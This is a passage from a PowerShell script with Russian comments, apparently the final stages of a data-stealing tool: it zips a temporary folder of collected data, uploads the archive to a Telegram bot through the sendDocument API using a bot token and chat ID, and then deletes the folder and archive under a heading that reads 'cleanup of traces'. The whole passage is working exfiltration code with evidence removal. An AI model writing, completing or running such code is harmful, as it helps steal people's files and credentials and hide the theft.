# 8. Архивация всей папки в ZIP
function Compress-Data {
    $zipFile = "$env:TEMP\data_$(Get-Random).zip"
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::CreateFromDirectory($tmpDir, $zipFile)
    return $zipFile
}

# 9. Отправка в Telegram
function Send-ToTelegram($filePath) {
    $url = "https://api.telegram.org/bot$telegramToken/sendDocument"
    $boundary = "---------------------------" + ([System.DateTime]::Now.Ticks).ToString("x")
    $body = "--$boundary`r`nContent-Disposition: form-data; name=`"chat_id`"`r`n`r`n$telegramChatID`r`n"
    $body += "--$boundary`r`nContent-Disposition: form-data; name=`"document`"; filename=`"data.zip`"`r`nContent-Type: application/zip`r`n`r`n"
    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
    $body += [System.Convert]::ToBase64String($fileBytes)
    $body += "`r`n--$boundary--"
    Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body -UseBasicParsing
}

# 10. Очистка следов
function Cleanup {
    Remove-Item -Path $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $zipFile -Force -ErrorAction SilentlyContinue
}

